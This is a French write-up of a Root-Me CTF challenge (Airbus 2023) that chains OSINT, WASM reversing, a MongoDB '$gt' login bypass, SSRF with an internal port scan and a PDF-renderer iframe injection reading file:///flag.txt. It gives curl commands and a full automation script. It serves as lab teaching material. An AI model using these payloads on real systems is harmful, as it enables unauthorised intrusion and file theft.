# Write-Up — VPN Provider
**CTF Airbus 2023 | Root-Me | Catégorie : Réaliste | 70 points**

---

## Contexte

> Une photo a été interceptée depuis le téléphone d'Alice, suspecte utilisant un VPN qui se dit "sans logs". Sont-ils vraiment sans logs ?

Le flag se trouve dans `/flag.txt` sur le serveur distant.

---

## Vue d'ensemble de la chaîne d'exploitation

```
EXIF → OSINT GitHub → Virtual Host → Reverse WASM
→ NoSQL Injection → SSRF → PDF HTML Injection → Flag
```

---

## Étape 1 — Analyse EXIF de la photo

On commence par analyser les métadonnées de l'image interceptée.

```bash
exiftool -a -u -g server_room.jpg
```

**Résultat clé :**
```
Image Copyright: (c) Made with the OpenSource NxMetaRemover tool
```

Le nom de l'outil nous donne un point de départ pour l'OSINT.

---

## Étape 2 — OSINT GitHub

On recherche le projet `NxMetaRemover` sur GitHub via l'API.

```bash
# Trouver le repo
curl -s "https://api.github.com/search/repositories?q=NxMetaRemover" \
  | python3 -m json.tool | grep -E "(full_name|html_url)"

# Récupérer le domaine depuis le profil de l'organisation
curl -s "https://api.github.com/users/NxShield" \
  | python3 -m json.tool | grep -E "(blog|company)"

# Lister tous les repos de NxShield
curl -s "https://api.github.com/users/NxShield/repos" \
  | python3 -m json.tool | grep -E "(name|description)"
```

**Résultats :**
- Organisation : `NxShield`
- Domaine : `nxshield.com`
- Repos : `NxMetaRemover`, `IP_Checker`

---

## Étape 3 — Virtual Host Discovery

Le serveur `challenge01.root-me.org` héberge plusieurs sites selon le header `Host`.

```bash
# Modifier /etc/hosts
echo "212.129.38.224 nxshield.com" | sudo tee -a /etc/hosts

# Ou utiliser curl avec le header Host
curl -v -H "Host: nxshield.com" http://challenge01.root-me.org/
```

**Résultat :** HTTP 200, le site NxShield VPN est accessible.

> **Concept :** Le Virtual Hosting permet à un seul serveur d'héberger plusieurs sites web. Le serveur utilise le header HTTP `Host` pour router la requête vers le bon site.

---

## Étape 4 — Reverse WASM (WebAssembly)

La page `/demo` sur `nxshield.com` présente un formulaire avec un champ "Access Code". La vérification se fait **côté client** via un fichier `demo.wasm` compilé depuis du C avec Emscripten.

### Analyse du WASM

Le fichier `demo.js` expose les fonctions exportées :
- `_check_size` — vérifie que le code fait **39 caractères**
- `_decrypt_password_step_1` — XOR avec 12
- `_decrypt_password_step_2` — soustraction de 13 modulo 256
- `_compare_passwords` — comparaison avec le token attendu
- `_decrypt_url` — déchiffre l'URL de redirection

### Données chiffrées dans le WASM

```
\00\1c\03\04\00...E\0c\0b\03\055\07\09\09\0b\19\19E\07\0aWO\09\0ePP^\0a[\07P\0e\07\09\0aXW\5cXY\0a^\07\0a\0a\0e\07\5c\5cXF\00\1c\03\04...3}bH6HcNH6OH}J6bLI\7f6ONLJ6IJc~6O3J}6}}2c
```

Les 39 derniers bytes forment le token chiffré.

### Déchiffrement en Python

```python
encrypted_bytes = bytes([
    0x33, 0x7d, 0x62, 0x48, 0x36, 0x48, 0x63, 0x4e, 0x48, 0x36, 0x4f, 0x48,
    0x7d, 0x4a, 0x36, 0x62, 0x4c, 0x49, 0x7f, 0x36, 0x4f, 0x4e, 0x4c, 0x4a,
    0x36, 0x49, 0x4a, 0x63, 0x7e, 0x36, 0x4f, 0x33, 0x4a, 0x7d, 0x36, 0x7d,
    0x7d, 0x32, 0x63
])

# Opération inverse : soustraire 13 puis XOR 12, modulo 256
token_chars = []
for b in encrypted_bytes:
    step1 = (b - 13) % 256
    step2 = step1 ^ 12
    token_chars.append(chr(step2))

token = ''.join(token_chars)
print(token)  # 2da7-7b57-67d9-a38f-6539-89be-629d-dd1b
```

**Token d'accès :** `2da7-7b57-67d9-a38f-6539-89be-629d-dd1b`

Ce token redirige vers `/demo_access/ab19cf886b5a8facb01403b6abbfa440.html`.

---

## Étape 5 — NoSQL Injection (Auth Bypass)

La page de login utilise **MongoDB** en backend. On peut injecter des opérateurs MongoDB dans les champs JSON.

```bash
curl -s -X POST "http://challenge01.root-me.org/demo_access/ab19cf886b5a8facb01403b6abbfa440.html" \
  -H "Host: nxshield.com" \
  -H "Content-Type: application/json" \
  -d '{"name": {"$gt": ""}, "password": {"$gt": ""}}' \
  -c /tmp/cookies.txt
```

**Réponse :**
```json
{"message":"You are logged in ! Redirect in progress..."}
```

> **Concept NoSQL Injection :** L'opérateur MongoDB `$gt` (greater than) avec une valeur vide `""` matche n'importe quel document dont le champ existe. En injectant cet opérateur dans les deux champs `name` et `password`, on bypasse complètement l'authentification sans connaître les credentials.

---

## Étape 6 — Découverte et exploitation du SSRF

### Lecture du code source IP_Checker

En analysant le repo GitHub `NxShield/IP_Checker`, on trouve dans `ip_checker.py` :

```python
def has_a_website(self, ip_address):
    try:
        render = (requests.get(ip_address).text)
    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
        ip_address = f"http://{ip_address}"
        render = (requests.get(ip_address).text)
    return render

def check(ip_address, show):
    if show != '':
        render_website = checker.has_a_website(ip_address)
        render.append(render_website)
        return render
```

Le paramètre `show` active la fonction `has_a_website` qui fait `requests.get(ip_address)` — c'est du **SSRF** !

### Confirmation du SSRF

```bash
SESSION=$(grep session /tmp/cookies.txt | awk '{print $7}')

curl -s -X POST "http://challenge01.root-me.org/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel" \
  -H "Host: nxshield.com" \
  -b "session=$SESSION" \
  -d "ip_address=https://webhook.site/VOTRE-UUID&show=True"
```

**Résultat sur webhook.site :** Requête reçue de `212.129.38.224` avec `user-agent: python-requests/2.31.0` ✅

> **Concept SSRF (Server Side Request Forgery) :** On force le serveur à faire des requêtes HTTP en notre nom. Cela permet d'accéder à des services internes normalement inaccessibles depuis l'extérieur.

---

## Étape 7 — Scan des ports internes

On utilise le SSRF pour scanner les ports internes du serveur.

```bash
SESSION=$(grep session /tmp/cookies.txt | awk '{print $7}')

for port in 80 443 1337 3000 5000 8000 8080; do
  echo -n "Port $port: "
  result=$(curl -s -X POST "http://challenge01.root-me.org/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel" \
    -H "Host: nxshield.com" \
    -b "session=$SESSION" \
    -d "ip_address=http://127.0.0.1:$port&show=True" | grep -o "textarea>.*</textarea" | head -c 100)
  echo "$result"
done
```

**Port ouvert trouvé : `1337`**

Sur ce port, un formulaire de génération de PDF avec les champs :
- `firstname`
- `lastname`
- `email`
- `address`

```bash
# Accéder au service interne sur le port 1337
curl -s -X POST "http://challenge01.root-me.org/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel" \
  -H "Host: nxshield.com" \
  -b "session=$SESSION" \
  -d "ip_address=http://127.0.0.1:1337&show=True" | grep -A10 "textarea"
```

---

## Étape 8 — HTML Injection dans le générateur PDF

Le formulaire est en **GET**, ce qui permet d'injecter du HTML directement dans les paramètres.

### Récupérer l'action du formulaire

```bash
curl -s -X POST "http://challenge01.root-me.org/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel" \
  -H "Host: nxshield.com" \
  -b "session=$SESSION" \
  -d "ip_address=http://127.0.0.1:1337&show=True" | grep "action"
# → /render-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
```

### Injecter une iframe vers /flag.txt

```bash
PAYLOAD='<iframe src="file:///flag.txt" width="100%" height="800"></iframe>'

curl -s -X POST "http://challenge01.root-me.org/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel" \
  -H "Host: nxshield.com" \
  -b "session=$SESSION" \
  --data-urlencode "ip_address=http://127.0.0.1:1337/render-XXXXXXXX?lastname=$PAYLOAD" \
  -d "show=True" | grep -A5 "textarea"
```

> **Concept HTML Injection → PDF :** Le moteur de rendu PDF (type wkhtmltopdf, WeasyPrint, etc.) interprète le HTML/CSS et peut accéder au système de fichiers local via le protocole `file://`. En injectant une `<iframe src="file:///flag.txt">`, on force le moteur à inclure le contenu du fichier dans le PDF généré.

---

## Étape 9 — Extraction du flag

Le serveur retourne le PDF encodé en **base64**.

```bash
# Décoder le PDF
echo "BASE64_DU_PDF" | base64 -d > flag.pdf

# Extraire le texte
pdftotext flag.pdf -

# Ou avec Python
python3 -c "
import base64
pdf_b64 = 'BASE64_DU_PDF'
with open('flag.pdf', 'wb') as f:
    f.write(base64.b64decode(pdf_b64))
"
```

**Flag : `RM{...}`** 🎉

---

## Script d'automatisation complet

```python
#!/usr/bin/env python3
"""
Write-Up Automatisé — VPN Provider (Root-Me CTF Airbus 2023)
"""

import requests
import base64
import re

TARGET = "http://challenge01.root-me.org"
HEADERS = {"Host": "nxshield.com"}
PANEL = f"{TARGET}/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel"
LOGIN = f"{TARGET}/demo_access/ab19cf886b5a8facb01403b6abbfa440.html"

def ssrf(session, url):
    r = session.post(PANEL, headers=HEADERS,
                     data={"ip_address": url, "show": "True"})
    match = re.search(r'<textarea>(.*?)</textarea>', r.text, re.DOTALL)
    return match.group(1) if match else ""

# 1. Auth bypass NoSQL
print("[3] 🍪 Auth bypass NoSQL Injection...")
s = requests.Session()
s.post(LOGIN, headers={**HEADERS, "Content-Type": "application/json"},
       json={"name": {"$gt": ""}, "password": {"$gt": ""}})
print(f"    Cookie: {s.cookies.get('session')}")

# 2. Trouver le port 1337
print("[4] 🔌 Scan du port interne 1337...")
html = ssrf(s, "http://127.0.0.1:1337")

# 3. Extraire l'action du formulaire
action = re.search(r'action="(/render-[^"]+)"', html).group(1)
print(f"[5] 📝 Action du formulaire: {action}")

# 4. Injection HTML → PDF
print("[6] 📡 Injection iframe file:///flag.txt...")
payload = '<iframe src="file:///flag.txt" width="100%" height="800"></iframe>'
pdf_response = ssrf(s, f"http://127.0.0.1:1337{action}?lastname={payload}")

# 5. Décoder le PDF et extraire le flag
print("[7] 📜 Décodage du PDF...")
pdf_bytes = base64.b64decode(pdf_response.strip())
with open("/tmp/flag.pdf", "wb") as f:
    f.write(pdf_bytes)

import subprocess
text = subprocess.check_output(["pdftotext", "/tmp/flag.pdf", "-"]).decode()
flag = re.search(r'RM\{[^}]+\}', text).group(0)
print(f"[9] 🚀 Flag 🎉 : {flag}")
```

---

## Récapitulatif des techniques

| # | Technique | Outil | Résultat |
|---|-----------|-------|---------|
| 1 | Analyse EXIF | `exiftool` | Nom de l'outil `NxMetaRemover` |
| 2 | OSINT GitHub | API GitHub | Domaine `nxshield.com` + repo `IP_Checker` |
| 3 | Virtual Host | Header `Host` | Accès au site NxShield |
| 4 | Reverse WASM | Analyse manuelle + Python | Token `2da7-7b57-67d9-a38f-6539-89be-629d-dd1b` |
| 5 | NoSQL Injection | `curl` + opérateur `$gt` | Auth bypass → cookie de session |
| 6 | SSRF | Paramètre `show=True` | Accès aux services internes |
| 7 | Port Scan interne | SSRF + boucle | Port `1337` avec générateur PDF |
| 8 | HTML Injection PDF | `<iframe src="file://">` | Lecture de `/flag.txt` |
| 9 | Extraction PDF | `pdftotext` / `base64` | **Flag récupéré** ✅ |

---

## Ressources

- [Root-Me](https://www.root-me.org/)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Emscripten WASM](https://emscripten.org/)
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)

---

*Write-up rédigé après résolution du challenge. Merci à Root-Me et Airbus pour ce challenge réaliste de qualité !*
